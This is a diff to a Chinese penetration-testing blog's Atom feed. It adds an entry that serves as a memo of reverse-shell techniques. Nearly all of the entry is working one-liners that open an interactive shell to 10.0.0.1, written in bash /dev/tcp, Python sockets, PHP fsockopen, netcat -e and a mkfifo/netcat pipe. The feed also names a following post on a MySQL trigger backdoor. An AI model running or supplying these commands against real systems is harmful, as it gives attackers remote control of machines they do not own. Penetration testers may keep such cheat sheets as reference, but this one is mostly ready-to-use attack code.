@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://blog.cyrils.org/"/>
-  <updated>2016-05-02T06:18:01.000Z</updated>
+  <updated>2016-05-02T06:26:45.000Z</updated>
   <id>http://blog.cyrils.org/</id>
   
   <author>
@@ -14,6 +14,32 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Reverse-Shell-Conclusion</title>
+    <link href="http://blog.cyrils.org/2016/05/02/Reverse-Shell-Conclusion/"/>
+    <id>http://blog.cyrils.org/2016/05/02/Reverse-Shell-Conclusion/</id>
+    <published>2016-05-02T06:19:46.000Z</published>
+    <updated>2016-05-02T06:26:45.000Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;记录一下一些在平时渗透中常见的shell反弹的姿势，备忘。&lt;/p&gt;
+&lt;h3 id=&quot;0x02&quot;&gt;&lt;a href=&quot;#0x02&quot; class=&quot;headerlink&quot; title=&quot;0x02&quot;&gt;&lt;/a&gt;0x02&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#bash环境下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;python -c &lt;span class=&quot;string&quot;&gt;&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;python -c &lt;span class=&quot;string&quot;&gt;&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#bash可能比sh好用一些，这个可以一样保存为1.py然后python执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;php -r &lt;span class=&quot;string&quot;&gt;&#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#同样bash可以替换，需要支持几个函数。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nc &lt;span class=&quot;_&quot;&gt;-e&lt;/span&gt; /bin/sh 10.0.0.1 1234&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#nc版本不一定支持-e&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;记录一下一些在平时渗透中常见的shell反弹的姿势，备忘。&lt;/p&gt;
+&lt;h3 id=&quot;0x02&quot;&gt;&lt;a href=&quot;#0x02
+    
+    </summary>
+    
+    
+      <category term="Pentest" scheme="http://blog.cyrils.org/tags/Pentest/"/>
+    
+  </entry>
   
   <entry>
     <title>MySQL-Trigger-Backdoor</title>
